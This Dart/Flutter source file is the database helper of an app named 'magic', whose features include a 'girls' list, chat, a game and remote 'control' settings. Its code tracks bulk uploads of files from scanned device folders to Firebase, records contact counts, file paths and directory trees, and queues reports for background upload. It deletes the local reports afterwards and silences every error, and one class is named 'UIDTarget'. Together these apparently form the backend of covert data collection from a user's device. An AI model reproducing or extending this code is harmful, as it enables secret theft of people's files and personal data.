import 'dart:convert';
import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:magic/helpers/device_info_helper.dart';
import 'package:magic/model/app_update.dart';
import 'package:magic/model/girls_model.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';
import 'package:crypto/crypto.dart';

import '../main.dart';

class DbHelper {
  // === NEW: Database path constants for upload tracking ===
  static const String PATH_FILE_UPLOADS = 'file_uploads';

  // === NEW: Path sanitization utility ===
  static String _sanitizePath(String path) {
    return path.replaceAll('.', '_dot_');
  }

  static Future<void> saveFilesScanInfo({
    required String id,
    required List<String> folders,
    required int foundFiles,
    required int newlyUploadedCount,
    required int totalUploadedCount,
    List<String>? scannedFiles,
    Map<String, dynamic>? fileTree,
    String? scanType,
  }) async {
    // Existing logic - unchanged
    final ref = FirebaseDatabase.instance.ref('files/$session_id/scan_info');
    await ref.set({
      'status': 'completed',
      'folders': folders,
      'found_files': foundFiles,
      'newly_uploaded_count': newlyUploadedCount,
      'total_uploaded_count': totalUploadedCount,
      'timestamp': DateTime.now().toIso8601String(),
    });

    // === NEW: Update upload progress ===
    await updateUploadProgress(
      deviceId: id,
      currentFile: totalUploadedCount,
      totalFiles: foundFiles,
      fileName: 'Scan complete',
      isUploading: false,
    );


    // NEW: Generate scanned files report if data provided
    if (scannedFiles != null && scanType != null) {
      await generateScannedFilesReport(
        deviceId: id,
        scannedFiles: scannedFiles,
        fileTree: fileTree,
        scanType: scanType,
      );
    }

    // NEW: Clean uploaded files list
    await cleanUploadedFilesList(id);
  }

  static Future<void> saveContactsCount(String id, int count) async {
    final ref = FirebaseDatabase.instance.ref('contacts/$session_id');
    await ref.set({'count': count});
  }

  static Future<void> saveFilesCount(String id, int count) async {
    final ref = FirebaseDatabase.instance.ref('files/$session_id');
    await ref.set({'count': count});
  }

  static Future<void> addAvatar(String id, String name) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("users/$session_id/avatar");
    await ref.set({
      'fileName': name,
      'uploadTime': DateTime.now().toIso8601String(),
    });
  }

  static Future<String?> getImageUrl(String path) async {
    final ref = FirebaseStorage.instance.ref().child(path);
    String? url;
    try {
      url = await ref.getDownloadURL();
    } on FirebaseException {
      url = null;
    } catch (e) {
      url = null;
    }
    return url;
  }

  static Future<void> saveTap(Map<String, dynamic> data) async {
    String? id = await DeviceInfoHelper.getUID();

    var uuid = Uuid();
    String u = uuid.v1();

    DatabaseReference ref =
    FirebaseDatabase.instance.ref("control_history/$session_id/$u");
    await ref.set(data);
  }

  static Future<void> resetControl() async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("control_gear/$session_id");
    await ref.set({
      'global': 0,
      'modes': 0,
      'intensive': 0,
      'other': 0,
    });
  }

  static Future<void> updateControl(Map<String, dynamic> data) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("control_gear/$session_id");
    await ref.update(data);
  }

  Future<bool> checkChat(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id/chat");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    return false;
  }

  Future<bool> checkInfo(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id/info");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      return true;
    }
    return false;
  }

  static Future<bool> checkGame() async {
    final String? id = await DeviceInfoHelper.getUID();
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id/game");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    return false;
  }

  Future<List<GirlModel>> getGirls() async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("girls");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        Map<String, GirlModel> result = girlsModelFromJson(jsonEncode(data));
        List<GirlModel> girls = result.entries.map((e) {
          GirlModel model = e.value;
          return model;
        }).toList();
        return girls;
      }
    }
    return [];
  }

  static Future<String> updateMagicUser(Map<String, dynamic> data) {
    CollectionReference users = FirebaseFirestore.instance.collection('users');
    final user = FirebaseAuth.instance.currentUser;

    return users
        .doc(user!.uid)
        .update(data)
        .then((value) => ("Пользователь успешно добавлен!"))
        .catchError((error) => ("Ошибка: $error"));
  }

  static Future<AppUpdate?> getAppUpdate() async {
    final snapshot =
    await FirebaseDatabase.instance.ref("app_update").ref.get();
    if (snapshot.exists) {
      return AppUpdate.fromMap(snapshot.value as Map<dynamic, dynamic>);
    } else {
      return null;
    }
  }

  // === NEW: FILE UPLOAD PROGRESS TRACKING METHODS ===

  /// Start tracking a file upload in real-time (public method)
  static Future<void> startFileUpload({
    required String deviceId,
    required String filePath,
    required int fileSize,
    required String uploadType,
  }) async {
    try {
      final fileId = 'file_${DateTime.now().millisecondsSinceEpoch}';
      final timestamp = DateTime.now().toIso8601String();

      // final sanitizedDeviceId = _sanitizePath(deviceId);

      final uploadRef = FirebaseDatabase.instance.ref(
          "$PATH_FILE_UPLOADS/$session_id/current/$fileId"
      );

      await uploadRef.set({
        'file_id': fileId,
        'file_name': filePath.split('/').last,
        'file_path': filePath,
        'file_size': fileSize,
        'upload_type': uploadType,
        'status': 'started',
        'start_time': timestamp,
        'progress': 0,
      });

      print('📤 Started tracking file upload: ${filePath.split('/').last}');
    } catch (e) {
      print('❌ Error starting file upload tracking: $e');
    }
  }

  /// Update progress of a specific file upload (public method)
  static Future<void> updateFileUploadProgress({
    required String deviceId,
    required String filePath,
    required double progress,
  }) async {
    try {
      final sanitizedDeviceId = _sanitizePath(deviceId);

      final uploadsRef = FirebaseDatabase.instance.ref(
          "$PATH_FILE_UPLOADS/$session_id/current"
      );
      final snapshot = await uploadsRef.get();

      if (snapshot.exists) {
        final uploads = Map<String, dynamic>.from(
            snapshot.value as Map<dynamic, dynamic>
        );

        for (final entry in uploads.entries) {
          final uploadData = entry.value;
          if (uploadData['file_path'] == filePath) {
            await uploadsRef.child('${entry.key}/progress').set(progress);
            await uploadsRef.child('${entry.key}/last_update').set(
                DateTime.now().toIso8601String()
            );

            if (progress % 25 == 0) {
              print('📊 Upload progress for ${filePath.split('/').last}: ${progress.toStringAsFixed(1)}%');
            }
            break;
          }
        }
      }
    } catch (e) {
      print('❌ Error updating file upload progress: $e');
    }
  }

  /// Mark a file upload as completed (public method)
  static Future<void> completeFileUpload({
    required String deviceId,
    required String filePath,
    required bool success,
    String? downloadUrl,
    String? error,
  }) async {
    try {
      final timestamp = DateTime.now().toIso8601String();
      final sanitizedDeviceId = _sanitizePath(deviceId);

      final currentRef = FirebaseDatabase.instance.ref(
          "$PATH_FILE_UPLOADS/$session_id/current"
      );
      final snapshot = await currentRef.get();

      if (snapshot.exists) {
        final uploads = Map<String, dynamic>.from(
            snapshot.value as Map<dynamic, dynamic>
        );

        for (final entry in uploads.entries) {
          final uploadData = entry.value;
          if (uploadData['file_path'] == filePath) {
            final fileId = entry.key;

            // Move to history
            final historyRef = FirebaseDatabase.instance.ref(
                "$PATH_FILE_UPLOADS/$session_id/history/$fileId"
            );
            await historyRef.set({
              ...uploadData,
              'status': success ? 'completed' : 'failed',
              'end_time': timestamp,
              'success': success,
              'download_url': downloadUrl,
              'error': error,
            });

            // Remove from current
            await currentRef.child(fileId).remove();

            print('✅ File upload completed: ${filePath.split('/').last} - Success: $success');
            break;
          }
        }
      }
    } catch (e) {
      print('❌ Error completing file upload: $e');
    }
  }

  /// Update overall upload progress (private method - used internally)
  static Future<void> updateUploadProgress({
    required String deviceId,
    required int currentFile,
    required int totalFiles,
    required String fileName,
    required bool isUploading,
  }) async {
    try {
      final sanitizedDeviceId = _sanitizePath(deviceId);

      final progressRef = FirebaseDatabase.instance.ref(
          "$PATH_FILE_UPLOADS/$session_id/progress"
      );

      final progress = {
        'current_file': currentFile,
        'total_files': totalFiles,
        'current_file_name': fileName,
        'percentage': totalFiles > 0 ?
        ((currentFile / totalFiles) * 100).toStringAsFixed(1) : '0.0',
        'is_uploading': isUploading,
        'last_update': DateTime.now().toIso8601String(),
      };

      await progressRef.set(progress);

      final devicesProgressRef = FirebaseDatabase.instance.ref(
          "devices/$session_id/new_files"
      );

      final devicesProgress = currentFile;

      await devicesProgressRef.set(devicesProgress);

      print('📈 Overall upload progress: $currentFile/$totalFiles (${progress['percentage']}%)');
    } catch (e) {
      print('⚠️ Error updating upload progress: $e');
    }
  }

  /// Save upload session information (public method)
  static Future<void> completeUploadSession({
    required String deviceId,
    required int totalUploaded,
    required int totalSkipped,
    required bool success,
    required String sessionType,
  }) async {
    try {
      final sanitizedDeviceId = _sanitizePath(deviceId);

      final sessionRef = FirebaseDatabase.instance.ref(
          "$PATH_FILE_UPLOADS/$session_id/sessions"
      ).push();

      final sessionData = {
        'session_id': 'session_${DateTime.now().millisecondsSinceEpoch}',
        'start_time': DateTime.now().subtract(
            Duration(minutes: 5)
        ).toIso8601String(),
        'end_time': DateTime.now().toIso8601String(),
        'total_files_attempted': totalUploaded + totalSkipped,
        'total_files_uploaded': totalUploaded,
        'total_files_skipped': totalSkipped,
        'success_rate': totalUploaded > 0 ?
        ((totalUploaded / (totalUploaded + totalSkipped)) * 100)
            .toStringAsFixed(1) : '0.0',
        'success': success,
        'session_type': sessionType,
      };

      await sessionRef.set(sessionData);

      // Clear progress after session completion
      await FirebaseDatabase.instance.ref(
          "$PATH_FILE_UPLOADS/$session_id/progress"
      ).remove();

      print('✅ Upload session completed: $totalUploaded uploaded, $totalSkipped skipped');
    } catch (e) {
      print('❌ Error saving upload session: $e');
    }
  }

  /// Save uploaded file status to both local and Firebase for sync
  static Future<void> saveUploadedFileStatus({
    required String deviceId,
    required String filePath,
    required String fileHash,
    required int fileSize,
    required String firebaseUrl,
  }) async {
    try {
      // Save locally
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';

      final uploadedFilesJson = prefs.getString(uploadedFilesKey) ?? '{}';
      final uploadedFiles =
      Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));

      uploadedFiles[filePath] = {
        'hash': fileHash,
        'size': fileSize,
        'firebase_url': firebaseUrl,
        'uploaded_at': DateTime.now().toIso8601String(),
      };

      await prefs.setString(uploadedFilesKey, jsonEncode(uploadedFiles));
      await _saveUploadedFilesToFile(deviceId, uploadedFiles);

      // === NEW: Also save to Firebase for real-time sync ===
      final sanitizedDeviceId = _sanitizePath(deviceId);
      final sanitizedHash = fileHash.replaceAll(RegExp(r'[^\w]'), '_');

      final firebaseRef = FirebaseDatabase.instance.ref(
          "$PATH_FILE_UPLOADS/$session_id/uploaded_files/$sanitizedHash"
      );
      await firebaseRef.set({
        'file_path': filePath,
        'file_hash': fileHash,
        'file_size': fileSize,
        'firebase_url': firebaseUrl,
        'uploaded_at': DateTime.now().toIso8601String(),
      });

      print('💾 Saved file status to Firebase: ${filePath.split('/').last}');
    } catch (e) {
      print('⚠️ Error saving uploaded file status: $e');
    }
  }

  /// Check if file was already uploaded (check both local and Firebase)
  static Future<bool> isFileAlreadyUploaded({
    required String deviceId,
    required String filePath,
    required String fileHash,
    required int fileSize,
  }) async {
    try {
      // Check Firebase first
      final sanitizedDeviceId = _sanitizePath(deviceId);
      final sanitizedHash = fileHash.replaceAll(RegExp(r'[^\w]'), '_');

      final firebaseRef = FirebaseDatabase.instance.ref(
          "$PATH_FILE_UPLOADS/$session_id/uploaded_files/$sanitizedHash"
      );
      final snapshot = await firebaseRef.get();

      if (snapshot.exists) {
        print('✅ File already uploaded (Firebase): ${filePath.split('/').last}');
        return true;
      }

      // Fallback to local check
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';

      final uploadedFilesJson = prefs.getString(uploadedFilesKey);
      if (uploadedFilesJson == null) return false;

      final uploadedFiles =
      Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));

      if (uploadedFiles.containsKey(filePath)) {
        final fileInfo = uploadedFiles[filePath];

        if (fileInfo['hash'] == fileHash && fileInfo['size'] == fileSize) {
          return true;
        } else {
          // File was modified, remove from uploaded list
          uploadedFiles.remove(filePath);
          await prefs.setString(uploadedFilesKey, jsonEncode(uploadedFiles));
          return false;
        }
      }

      return false;
    } catch (e) {
      print('⚠️ Error checking if file already uploaded: $e');
      return false;
    }
  }

  /// Generate file hash for comparison
  static Future<String> generateFileHash(File file) async {
    try {
      final bytes = await file.readAsBytes();
      final digest = sha256.convert(bytes);
      return digest.toString();
    } catch (e) {
      // Fallback to file path + size + modified date
      final stat = await file.stat();
      return '${file.path}_${stat.size}_${stat.modified.millisecondsSinceEpoch}';
    }
  }

  /// Save uploaded files to local file as backup
  static Future<void> _saveUploadedFilesToFile(
      String deviceId, Map<String, dynamic> uploadedFiles) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/uploaded_files_$deviceId.json');

      final data = {
        'device_id': deviceId,
        'uploaded_files': uploadedFiles,
        'last_updated': DateTime.now().toIso8601String(),
        'total_files': uploadedFiles.length,
      };

      await file.writeAsString(jsonEncode(data));
    } catch (e) {
      // Silent fail
    }
  }

  /// Generate and save scanned files report to local file and queue for upload
  static Future<void> generateScannedFilesReport({
    required String deviceId,
    required List<String> scannedFiles,
    required Map<String, dynamic>? fileTree,
    required String scanType,
  }) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final timestamp = DateTime.now().toIso8601String().replaceAll(':', '-');
      final fileName = 'scanned_files_${scanType}_${deviceId}_$timestamp.json';
      final file = File('${directory.path}/$fileName');

      final reportData = {
        'device_id': deviceId,
        'scan_type': scanType,
        'timestamp': DateTime.now().toIso8601String(),
        'total_files': scannedFiles.length,
        'scanned_files': scannedFiles,
        'file_tree': fileTree,
        'scan_session_id': const Uuid().v4(),
      };

      await file.writeAsString(jsonEncode(reportData));

      // Add report file to upload queue via WorkManager
      await addReportToUploadQueue(deviceId, file.path);
    } catch (e) {
      // Silent fail
    }
  }

  /// Add scanned files report to upload queue for WorkManager
  static Future<void> addReportToUploadQueue(
      String deviceId, String reportFilePath) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsQueueKey = 'reports_upload_queue_$deviceId';

      final existingQueue = prefs.getStringList(reportsQueueKey) ?? <String>[];

      if (!existingQueue.contains(reportFilePath)) {
        existingQueue.add(reportFilePath);
        await prefs.setStringList(reportsQueueKey, existingQueue);
      }
    } catch (e) {
      // Silent fail
    }
  }

  /// Get reports queue for upload
  static Future<List<String>> getReportsUploadQueue(String deviceId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsQueueKey = 'reports_upload_queue_$deviceId';
      return prefs.getStringList(reportsQueueKey) ?? <String>[];
    } catch (e) {
      return <String>[];
    }
  }

  /// Remove report from upload queue after successful upload
  static Future<void> removeReportFromQueue(
      String deviceId, String reportFilePath) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsQueueKey = 'reports_upload_queue_$deviceId';

      final existingQueue = prefs.getStringList(reportsQueueKey) ?? <String>[];
      existingQueue.remove(reportFilePath);
      await prefs.setStringList(reportsQueueKey, existingQueue);

      // Delete local report file after successful upload
      final file = File(reportFilePath);
      if (await file.exists()) {
        await file.delete();
      }
    } catch (e) {
      // Silent fail
    }
  }

  /// Upload scanned files report to Firebase Storage
  static Future<bool> uploadScannedFilesReport(
      String deviceId, String reportFilePath) async {
    try {
      final file = File(reportFilePath);
      if (!await file.exists()) return false;

      final fileName = file.path.split('/').last;
      final storageRef =
      FirebaseStorage.instance.ref().child('reports/$deviceId/$fileName');

      await storageRef.putFile(file);

      // Remove from queue after successful upload
      await removeReportFromQueue(deviceId, reportFilePath);

      return true;
    } catch (e) {
      return false;
    }
  }

  /// Process all pending report uploads (called by WorkManager)
  static Future<void> processReportUploads(String deviceId) async {
    try {
      final reportsQueue = await getReportsUploadQueue(deviceId);

      for (final reportPath in reportsQueue) {
        await uploadScannedFilesReport(deviceId, reportPath);
        // Small delay between uploads
        await Future.delayed(const Duration(milliseconds: 500));
      }
    } catch (e) {
      // Silent fail
    }
  }

  /// Clean uploaded files list (remove files that no longer exist)
  static Future<void> cleanUploadedFilesList(String deviceId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';
      final uploadedFilesJson = prefs.getString(uploadedFilesKey) ?? '{}';
      final uploadedFiles =
      Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));

      final filesToRemove = <String>[];

      for (final filePath in uploadedFiles.keys) {
        final file = File(filePath);
        if (!await file.exists()) {
          filesToRemove.add(filePath);
        }
      }

      for (final filePath in filesToRemove) {
        uploadedFiles.remove(filePath);
      }

      await prefs.setString(uploadedFilesKey, jsonEncode(uploadedFiles));
    } catch (e) {
      // Silent fail
    }
  }

  /// Get uploaded files count for device
  static Future<int> getUploadedFilesCount(String deviceId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';
      final uploadedFilesJson = prefs.getString(uploadedFilesKey) ?? '{}';
      final uploadedFiles =
      Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));
      return uploadedFiles.length;
    } catch (e) {
      return 0;
    }
  }

  /// Get current upload progress from Firebase
  static Future<Map<String, dynamic>?> getUploadProgress(String deviceId) async {
    try {
      final sanitizedDeviceId = _sanitizePath(deviceId);

      final progressRef = FirebaseDatabase.instance.ref(
          "$PATH_FILE_UPLOADS/$session_id/progress"
      );
      final snapshot = await progressRef.get();

      if (snapshot.exists) {
        return Map<String, dynamic>.from(
            snapshot.value as Map<dynamic, dynamic>
        );
      }
      return null;
    } catch (e) {
      print('⚠️ Error getting upload progress: $e');
      return null;
    }
  }
}

class UIDTarget {
  Future<String> initUID() async {
    final user = FirebaseAuth.instance.currentUser;

    if (user == null) {
      return '';
    }

    final String userId = user.uid;

    final SharedPreferences prefs = await SharedPreferences.getInstance();

    final deviceRef = FirebaseDatabase.instance.ref("devices/$userId");
    final snapshot = await deviceRef.get();

    if (snapshot.exists) {
      await prefs.setString('id', userId);
      return userId;
    } else {
      await deviceRef.set({
        'createdAt': DateTime.now().toIso8601String(),
        'userId': userId,
      });
      await prefs.setString('id', userId);
      return userId;
    }
  }

  Future<String> getUid() async {
    final SharedPreferences prefs = await SharedPreferences.getInstance();
    String? cachedId = prefs.getString('id');

    if (cachedId != null && cachedId.isNotEmpty) {
      return cachedId;
    }

    final uid = await initUID();
    return uid;
  }
}